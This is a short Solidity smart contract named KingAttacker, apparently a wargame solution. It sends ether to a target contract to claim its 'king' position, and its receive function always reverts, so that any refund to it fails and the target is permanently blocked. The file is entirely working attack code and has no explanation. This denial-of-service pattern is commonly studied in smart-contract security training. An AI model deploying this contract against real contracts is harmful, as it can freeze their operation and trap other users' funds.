// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {
    address target;

    constructor(address _targetAddress) {
        target = _targetAddress;
    }

    function attack() public payable {
        (bool sent, ) = payable(target).call{value: msg.value}("");
        require(sent, "Send Failed!");
    }

    receive() external payable {
        revert("NOPES!");
    }
}
